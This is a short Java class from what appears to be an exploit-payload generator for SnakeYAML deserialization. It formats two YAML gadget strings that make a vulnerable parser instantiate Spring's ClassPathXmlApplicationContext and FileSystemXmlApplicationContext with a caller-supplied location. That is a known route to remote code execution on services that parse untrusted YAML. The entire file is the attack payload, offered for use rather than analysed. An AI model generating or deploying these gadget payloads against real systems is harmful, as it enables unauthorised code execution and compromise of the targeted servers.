package cn.butler.snakeyaml.payloads;

import cn.butler.payloads.ObjectPayload;

public class ClassPathXmlApplicationContext implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String yamlPayload1 = "!!org.springframework.context.support.ClassPathXmlApplicationContext [\"%s\"]";
        yamlPayload1 = String.format(yamlPayload1, command);

        String yamlPayload2 = "!!org.springframework.context.support.FileSystemXmlApplicationContext [\"%s\"]";
        yamlPayload2 = String.format(yamlPayload2, command);
        return yamlPayload1 + "\n" + yamlPayload2;
    }
}
